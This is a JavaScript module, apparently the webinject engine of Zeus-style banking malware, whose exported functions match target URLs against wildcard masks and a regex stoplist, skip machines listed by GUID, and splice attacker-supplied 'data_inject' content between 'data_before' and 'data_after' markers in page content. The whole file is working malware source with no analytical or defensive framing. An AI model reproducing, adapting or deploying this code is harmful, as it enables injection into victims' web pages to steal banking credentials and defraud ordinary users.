function zeusSearchContentIndex(data, mask, startOffset) {
    var searchParts = mask.split('*');
    var firstIndex = data.indexOf(searchParts[0], startOffset);
    var lstIndex = firstIndex + searchParts[0].length;
    var result;

    for (var i = 1; i < searchParts.length; i++) {
        lstIndex = data.indexOf(searchParts[i], lstIndex);
        if (lstIndex === -1) {
            break;
        }

        lstIndex += searchParts[i].length;
    }

    if (lstIndex !== -1 && searchParts[searchParts.length - 1] === '') {
        lstIndex = data.length;
    }

    if (lstIndex !== -1 && firstIndex !== -1 && firstIndex < lstIndex) {
        result = data.substr(firstIndex, lstIndex - firstIndex);
    }

    return result;
}
function zeusExecuteInjection(data, injectionBlock) {

    var startTag;
    var startTagIndex;
    var endTag;
    var endTagIndex;

    if ((injectionBlock.data_before.length > 0) && (injectionBlock.data_after.length > 0)) {

        startTag = zeusSearchContentIndex(data, injectionBlock.data_before);
        endTag = zeusSearchContentIndex(data, injectionBlock.data_after);

        if (startTag && endTag) {

            startTagIndex = (data.indexOf(startTag) + startTag.length);
            endTagIndex = data.indexOf(endTag, startTagIndex);

            if (startTagIndex < endTagIndex) {
                return data
                    .cut(startTagIndex, endTagIndex)
                    .insertAt(startTagIndex, injectionBlock.data_inject);

            } else {
                
            }
        } else {
            
        }

    } else if (injectionBlock.data_before.length > 0) {
        startTag = zeusSearchContentIndex(data, injectionBlock.data_before);
        if (startTag) {
            startTagIndex = (data.indexOf(startTag) + startTag.length);
            return data.insertAt(startTagIndex, injectionBlock.data_inject);
        } else {
            return data;
        }
    } else if (injectionBlock.data_after.length > 0) {
        endTag = zeusSearchContentIndex(data, injectionBlock.data_after);
        if (endTag) {
            endTagIndex = data.indexOf(endTag);
            return data.insertAt(endTagIndex, injectionBlock.data_inject);
        } else {
            return data;
        }

    } else {
        return injectionBlock.data_inject;
    }
}

function zeusIsModificationNeeded(url, mask) {
    if (typeof zeusSearchContentIndex(url, mask) !== 'undefined') {
        return true;
    }
    return false;
}


function zeusIsMaskMatched(text, mask) {
    if (typeof zeusSearchContentIndex(text, mask) !== 'undefined') {
        return true;
    }
    return false;
}


function isRegexMatched(str, restr) {
    try {
        var re = new RegExp(restr, "ig");
        if (str.match(re)) {
            return true;
        }
    } catch (exception) { }

    return false;
}

function isUrlNeedMatchedInRule(murl, inject) {

    if (inject.base.guids) {
        if (inject.base.guids.find(function (element) {
            return (inject.base.guids.indexOf(process.machineGuid.toLowerCase()) !== -1);
        })) {
            return false;
        }
    }

    if (!inject.base.url.find(function (element) {
        return zeusIsModificationNeeded(murl, element);
    })) {
        return false;
    }

    if (inject.stoplist) {
        if (inject.stoplist.find(function (element) {
                return isRegexMatched(murl, element);
        })) {
            return false;
        }
    }
    return true;
}

exports.isUrlNeedMatchedInRule = isUrlNeedMatchedInRule;
exports.zeusIsMaskMatched = zeusIsMaskMatched;
exports.zeusIsModificationNeeded = zeusIsModificationNeeded;
exports.zeusExecuteInjection = zeusExecuteInjection;
exports.zeusSearchContentIndex = zeusSearchContentIndex;
